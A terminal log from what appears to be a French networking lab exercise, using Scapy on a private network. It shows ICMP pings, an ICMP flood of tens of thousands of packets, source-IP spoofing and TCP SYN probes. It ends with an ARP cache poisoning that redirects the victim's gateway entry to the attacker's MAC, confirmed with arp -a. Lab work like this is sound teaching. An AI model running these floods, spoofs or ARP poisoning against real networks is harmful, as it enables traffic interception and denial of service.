```
caslu@caslu-ThinkPad:~/.local/scapy$ sudo ./run_scapy 
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: No alternative Python interpreters found ! Using standard Python shell instead.
INFO: Using the default Python shell: History is disabled.
                                      
                     aSPY//YASa       
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.6.1.dev153
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like it is your last
       scccccp///pSP///p          p//Y   | day on earth.
      sY/////////y  caa           S//P   |                      -- Lao-Tze
       cayCyayP//Ya              pY/Ya   |
        sY/PsY////YCc          aC//Yp 
         sc  sccaCY//PCypaapyCP//YSs  
                  spCPY//////YPSps    
                       ccaacs         
                                      
>>> a = IP(dst="172.20.10.2", src="172.20.10.13")/ICMP()
>>> a = IP(dst="172.20.10.2")/ICMP(type=8, code=0)
>>> a.summary()
'IP / ICMP 172.20.10.13 > 172.20.10.2 echo-request 0'
>>> res = sr(a)
Begin emission
...
Finished sending 1 packets
*
Received 4 packets, got 1 answers, remaining 0 packets
>>> res[0].summary()
IP / ICMP 172.20.10.13 > 172.20.10.2 echo-request 0 ==> IP / ICMP 172.20.10.2 > 172.20.10.13 echo-reply 0
>>> b = Ether()
>>> sendp(Ether(dst="40:74:e0:fb:ae:82")/IP(dst="172.20.10.2")/ICMP())
.
Sent 1 packets.
>>> sendp(IP(dst="172.20.10.2")/ICMP(), count=100000)
................................................................................................................................................................................................................................................................................................................................................
Sent 31856 packets.
>>> sendp(IP(dst="172.20.10.2")/ICMP(), count=10)
..........
Sent 10 packets.
>>> 
>>> sendp(Ether(dst="40:74:e0:fb:ae:82")/IP(src="1.1.1.1",dst="172.20.10.2")/ICMP())
.
Sent 1 packets.
>>> 
>>> send(IP(dst="172.20.10.2")/TCP(dport=80,flags="S"))
WARNING: MAC address to reach destination not found. Using broadcast.
.
Sent 1 packets.
>>> 
>>> send(IP(dst="172.20.10.2")/TCP(sport=666,dport=(440,443),flags="S"))
....
Sent 4 packets.
>>>
--------------------------------
Exercice 6
--------------------------------

sou@sou-ThinkPad-X280:~/trash$ arp -a
? (172.20.10.13) at 14:ab:c5:7b:d3:6a [ether] on wlp59s0
_gateway (172.20.10.1) at ee:0d:51:f8:ff:64 [ether] on wlp59s0

>>> sendp(Ether(dst="40:74:e0:fb:ae:82",src="14:ab:c5:7b:d3:6a")/ARP(op="is-at",psrc="172.20.10.1",pdst="172.20.10.2"),iface="wlp3s0")
.
Sent 1 packets.
>>>

sou@sou-ThinkPad-X280:~/trash$ arp -a
? (172.20.10.13) at 14:ab:c5:7b:d3:6a [ether] on wlp59s0
_gateway (172.20.10.1) at 14:ab:c5:7b:d3:6a [ether] on wlp59s0

on passe bien de l'adresse MAC de la gateway, à la mienne 
```
